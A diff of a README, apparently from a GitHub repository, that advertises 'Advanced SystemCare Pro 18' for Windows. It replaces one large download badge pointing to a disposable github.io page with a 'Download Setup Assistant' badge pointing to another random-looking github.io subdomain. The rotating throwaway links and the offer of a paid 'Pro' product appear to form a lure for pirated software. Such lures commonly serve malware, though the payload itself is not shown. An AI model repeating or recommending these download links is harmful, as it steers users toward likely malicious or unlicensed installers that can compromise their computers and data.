@@ -5,13 +5,7 @@
 
 <h1 align="center">⚙️ Advanced SystemCare Pro 18 (Windows)</h1>
 
-<p align="center">
-  <a href="https://advanced-systemcare-pro-18-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Advanced%20SystemCare%20Pro%2018-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download Advanced SystemCare Pro 18 for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://rosadaernaguorwkj.github.io/.github/advanced-systemcare-pro-18)
 
 <p align="center">
   <img src="https://danhvo.net/wp-content/uploads/2024/10/image-3.png" alt="Advanced SystemCare Pro 18 Interface Preview" width="600" />
